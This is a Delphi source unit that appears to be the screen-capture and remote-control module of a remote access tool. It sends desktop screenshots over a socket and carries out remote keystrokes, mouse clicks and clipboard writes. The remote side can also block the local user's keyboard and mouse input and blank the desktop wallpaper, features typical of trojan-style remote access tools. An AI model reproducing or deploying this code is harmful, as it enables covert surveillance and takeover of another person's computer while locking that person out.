unit UnitScreenCapture;

interface

uses
  windows,socketunit, unitshareddata, umsfpack, CompressionStreamUnit;

var
  dummy: string;
  function BlockInput(fBlockInput: Boolean): DWORD; stdcall; external 'user32.dll';

threadvar
  CaptureData: string;
  InputBlocked: bool;

function SaveBitmapToFile(HBM: HBitmap;BitCount: word): string;
procedure ParseData(Socket: TClientSocket; Data: string);

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'ScreenCapture|' + Data);
end;


function SaveBitmapToFile(HBM: HBitmap;BitCount: word): string;
const
  BMType = $4D42;
type
  TBitmap = record
    bmType: Integer;
    bmWidth: Integer;
    bmHeight: Integer;
    bmWidthBytes: Integer;
    bmPlanes: Byte;
    bmBitsPixel: Byte;
    bmBits: Pointer;
  end;
var
  BM: TBitmap;
  BFH: TBitmapFileHeader;
  BIP: PBitmapInfo;
  DC: HDC;
  HMem: THandle;
  Buf: Pointer;
  ColorSize, DataSize: Longint;
  stream: tmemorystream;

  function AlignDouble(Size: Longint): Longint;
  begin
    Result := (Size + 31) div 32 * 4;
  end;

begin
  if GetObject(HBM, SizeOf(TBitmap), @BM) = 0 then Exit;



  //BitCount := 4;
  if (BitCount <> 24) then ColorSize := SizeOf(TRGBQuad) * (1 shl BitCount) else ColorSize := 0;

  DataSize := AlignDouble(bm.bmWidth * BitCount) * bm.bmHeight;
  GetMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);

  if BIP <> nil then begin
    with BIP^.bmiHeader do begin
      biSize := SizeOf(TBitmapInfoHeader);
      biWidth := bm.bmWidth;
      biHeight := bm.bmHeight;
      biPlanes := 1;
      biBitCount := BitCount;
      biCompression := 0;
      biSizeImage := DataSize;
      biXPelsPerMeter := 0;
      biYPelsPerMeter := 0;
      biClrUsed := 0;
      biClrImportant := 0;
    end;

    with BFH do begin
      bfOffBits := SizeOf(BFH) + SizeOf(TBitmapInfo) + ColorSize;
      bfReserved1 := 0;
      bfReserved2 := 0;
      bfSize := longint(bfOffBits) + DataSize;
      bfType := BMType;
    end;

    HMem := GlobalAlloc(gmem_Fixed, DataSize);
    if HMem <> 0 then begin
      Buf := GlobalLock(HMem);
      DC := GetDC(0);
      if GetDIBits(DC, hbm, 0, bm.bmHeight,Buf, BIP^, dib_RGB_Colors) <> 0 then begin

        Stream := TMemoryStream.Create;
        Stream.WriteBuffer(BFH, SizeOf(BFH));
        Stream.WriteBuffer(PChar(BIP)^, SizeOf(TBitmapInfo) + ColorSize);
        Stream.WriteBuffer(Buf^, DataSize);
        //Stream.SaveToFile('c:\server.bmp');;
        SetString(Result, PChar(Stream.Memory), Stream.Size);
        stream.Free;

      end;
      ReleaseDC(0, DC);
      GlobalUnlock(HMem);
      GlobalFree(HMem);
    end;

  end;
  FreeMem(BIP, SizeOf(TBitmapInfoHeader) + ColorSize);
  DeleteObject(HBM);
end;

function CompareString(s1,s2: string; Len: dword): string;
var
  i: integer;
begin
  if Length(s1) <> Length(s2) then exit;
  setlength(Result,Len);
  for i := 1 to Len do begin
    if s1[i] <> s2[i] then begin
      Result[i] := s2[i];
    end else begin
      Result[i] := '%';
    end;
  end;
end;

function GetDesktop(DrawCursor: bool): HBitmap;
var
  DC, MemDC, Bitmap, OBitmap: HBitmap;
  Cursor: TCursorInfo;
  ScreenWidth,ScreenHeight: Integer;
begin
  DC := GetDC(GetDesktopWindow);
  ScreenWidth := GetDeviceCaps(DC, HORZRES);
  ScreenHeight := GetDeviceCaps(DC, VERTRES);

  MemDC := CreateCompatibleDC(DC);

  Bitmap := CreateCompatibleBitmap(DC, ScreenWidth, ScreenHeight);
  OBitmap := SelectObject(MemDC, Bitmap);

  StretchBlt(MemDC, 0, 0, ScreenWidth, ScreenHeight, DC, 0, 0, ScreenWidth, ScreenHeight, SRCCOPY);

  if DrawCursor then begin
    Cursor.cbSize := SizeOf(Cursor);
    GetCursorInfo(Cursor);
    DrawIcon(MemDC,Cursor.ptScreenPos.X,Cursor.ptScreenPos.y,Cursor.hCursor);
  end;

  SelectObject(MemDC, OBitmap);
  DeleteDC(MemDC);
  ReleaseDC(GetDesktopWindow, DC);
  Result := Bitmap;
end;

procedure SetBuffer(Format: Word; var Buffer; Size: Integer);
var
  Data: THandle;
  DataPtr: Pointer;
begin
  openclipboard(0);
  try
    Data := GlobalAlloc(GMEM_MOVEABLE + GMEM_DDESHARE, Size);
    try
      DataPtr := GlobalLock(Data);
      try
        Move(Buffer, DataPtr^, Size);
        SetClipboardData(Format, Data);
      finally
        GlobalUnlock(Data);
      end;
    except
      GlobalFree(Data);
    end;
  finally
  end;
  closeclipboard;
end;

procedure SetClipBoardText(const Value: string);
begin
  SetBuffer(CF_TEXT, PChar(Value)^, Length(Value) + 1);
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  D: string;
  Command: string;
  stringtosend: string;
  BCount,i: integer;
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if SocketData = nil then exit;

  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'ScreenShot' then begin
    BCount := StrToInt(split(Data,'|',1));
    i := strtoint(split(Data,'|',2));
    D := SaveBitmapToFile(GetDesktop(bool(i)),BCount);
    if CaptureData = '' then CaptureData := StringOfChar('%',Length(d));
    StringToSend := CompareString(CaptureData,d,length(d));
    CaptureData := d;
    StringToSend := SFPackStr(StringToSend);
    SendData(Socket,Command + '|' + StringToSend);
  end;

   if Command = 'ClearData' then begin
    CaptureData := '';
  end;

  if Command = 'MousePos' then begin
    BlockInput(False);
    SetCursorPos(strtoint(split(Data,'|',1)),strtoint(split(Data,'|',2)));
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'KeyDown' then begin
    BlockInput(False);
    keybd_event(strtoint(Data),0,0,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'KeyUp' then begin
    BlockInput(False);
    keybd_event(strtoint(Data),0,KEYEVENTF_KEYUP,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'LeftMouseDown' then begin
    BlockInput(False);
    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'LeftMouseUp' then begin
    BlockInput(False);
    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'RightMouseDown' then begin
    BlockInput(False);
    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'RightMouseUp' then begin
    BlockInput(False);
    mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'Clipboard' then begin
    SetClipBoardText(Data);
  end;

  if Command = 'RemoveDesktop' then begin
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0,pchar(''), SPIF_SENDCHANGE);
  end;

  if Command = 'BlockInput' then begin
    InputBlocked := True;
    BlockInput(True);
  end;

  if Command = 'EnableInput' then begin
    BlockInput(False);
    InputBlocked := False;
  end;

  if Command = 'RightMouseClick' then begin
    BlockInput(False);
    SetCursorPos(strtoint(split(Data,'|',1)),strtoint(split(Data,'|',2)));
    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
    mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'RightMouseDoubleClick' then begin
    BlockInput(False);
    SetCursorPos(strtoint(split(Data,'|',1)),strtoint(split(Data,'|',2)));
    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
    mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
    mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'LeftMouseClick' then begin
    BlockInput(False);
    SetCursorPos(strtoint(split(Data,'|',1)),strtoint(split(Data,'|',2)));
    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
    if InputBlocked then BlockInput(True);
  end;

  if Command = 'LeftMouseDoubleClick' then begin
    BlockInput(False);
    SetCursorPos(strtoint(split(Data,'|',1)),strtoint(split(Data,'|',2)));
    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
    mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
    if InputBlocked then BlockInput(True);
  end;

end;


end.
